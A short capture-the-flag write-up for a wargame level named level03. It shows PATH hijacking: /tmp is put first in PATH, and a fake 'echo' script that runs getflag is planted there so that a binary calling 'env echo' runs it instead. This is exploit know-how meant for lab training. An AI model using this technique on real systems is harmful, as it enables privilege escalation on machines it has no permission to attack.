There is file level03. We download it with scp -P 4242 level03@192.168.1.78:~/level03 .
We open it with notepad and we can read "/usr/bin/env echo Exploit me"

We export the $PATH to tmp to be able to add a file.

$ export PATH="/tmp:$PATH"

Before exporting, the $PATH is "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games".
When we write a command, the shell will search for the executable file in the $PATH.
It will start looking in "/usr/local/sbin", then "/usr/local/bin"...
After the export, the $PATH is "/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games".
Now the shell will look into /tmp first to find the command.

Then we add a file named echo that will execute getflag so when we launch ./level03, echo will be replaced by getflag.
$ echo "/bin/getflag" > /tmp/echo

We make that file executable
$ chmod +x /tmp/echo

Then we can launch the level03 executable to get the flag
$ ./level03
